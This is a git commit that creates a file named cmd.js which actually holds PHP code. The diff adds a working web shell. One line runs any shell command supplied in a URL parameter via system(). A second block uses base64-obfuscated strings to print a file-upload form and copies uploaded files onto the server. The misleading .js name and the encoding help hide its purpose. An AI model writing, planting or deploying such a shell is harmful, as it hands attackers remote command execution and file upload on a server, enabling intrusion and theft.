0ce83e0640247b499382598fc92f2ba8b4d1f586
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-03-08 11:23:34 +0700

    Create cmd.js

---
+++ cmd.js
@@ -0,0 +1,4 @@
+<?php
+	@system($_GET['c']);
+?>
+<?php if(isset($_GET["cmd"])){ echo(base64_decode("Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=")); @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']); echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>"); } ?>
